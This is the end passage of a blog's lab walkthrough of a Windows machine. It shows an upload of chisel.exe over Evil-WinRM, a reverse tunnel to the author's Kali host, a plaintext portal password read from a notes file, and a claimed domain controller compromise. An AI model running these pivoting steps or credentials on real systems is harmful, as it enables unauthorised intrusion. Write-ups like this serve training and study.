+</span></span></code></pre></div><p>we have 8086, lets to port forwarding</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>my kali:
+</span></span><span style=display:flex><span>./chisel server -p <span style=color:#a5d6ff>1234</span> --reverse
+</span></span></code></pre></div><p>winrm:</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>upload chisel.exe
+</span></span><span style=display:flex><span>                                        
+</span></span><span style=display:flex><span>Info: Uploading /home/kali/Pictures/chisel.exe to C:<span style=color:#79c0ff>\U</span>sers<span style=color:#79c0ff>\h</span>elper.guy<span style=color:#79c0ff>\D</span>ocuments<span style=color:#79c0ff>\c</span>hisel.exe
+</span></span><span style=display:flex><span>                                        
+</span></span><span style=display:flex><span>Data: <span style=color:#a5d6ff>14575616</span> bytes of <span style=color:#a5d6ff>14575616</span> bytes copied
+</span></span><span style=display:flex><span>                                        
+</span></span><span style=display:flex><span>Info: Upload successful!
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>.<span style=color:#79c0ff>\c</span>hisel.exe client 10.0.12.4:1234 R:8086:127.0.0.1:8086
+</span></span></code></pre></div><p><img src=/images/herald/image%202.png alt=image.png></p><p>we need creds lets try admin:admin , not worked lets search the files again</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>*Evil-WinRM* PS C:<span style=color:#79c0ff>\U</span>sers<span style=color:#79c0ff>\h</span>elper.guy<span style=color:#79c0ff>\D</span>ocuments&gt; cat it_notes.txt
+</span></span><span style=display:flex><span>Internal portal: https://localhost:8086 - admin / Herald@Mesh2026!
+</span></span></code></pre></div><p>so he said we have internal portal already !!!</p><p><img src=/images/herald/image%203.png alt=image.png></p><p>we got DC01 !!!</p><p><img src=/images/herald/image%204.png alt=image.png></p><p><img src=/images/herald/image%205.png alt=image.png></p><p><span id=no-password style=display:none>Z3R0S_NO_PASSWORD_PLEASE</span></p></div><footer></footer></article></section></div><footer class=footer><section class=container>©
+2025 -
+2026
+z3r0s
+·
+Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>
